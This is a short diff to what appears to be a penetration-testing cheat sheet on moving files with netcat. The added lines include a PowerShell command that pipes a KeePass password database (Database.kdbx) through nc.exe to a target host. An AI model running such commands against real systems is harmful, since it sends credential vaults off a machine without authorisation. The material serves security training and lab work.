@@ -436,6 +436,8 @@ ssh username@target_ip #enter password if you gave any
 ```bash
 #Attacker
 nc <target_ip> 1234 < nmap
+# Error due to '<'
+powershell>Get-Content .\Database.kdbx | .\nc.exe <target_ip> 1234
 
 #Target
 nc -lvp 1234 > nmap
